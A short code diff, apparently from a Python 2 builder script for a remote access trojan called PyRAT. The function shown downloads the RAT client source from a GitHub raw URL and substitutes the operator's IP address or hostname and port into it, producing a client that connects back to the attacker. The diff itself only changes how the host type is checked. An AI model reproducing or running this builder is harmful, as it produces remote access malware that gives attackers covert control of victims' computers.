@@ -10,7 +10,7 @@
 import sys, os, subprocess, urllib2, colorama
 
 def get_client(host, port, host_type):
-	if host_type == True:
+	if host_type == "-ip":
 		return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/client.py").read().replace("HOST = '127.0.0.1'", "HOST = '%s'"%(host)).replace("PORT = int('8000')", "PORT = int('%s')"%(port))
 	else:
 		return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = int('8000')", "PORT = int('%s')"%(port))
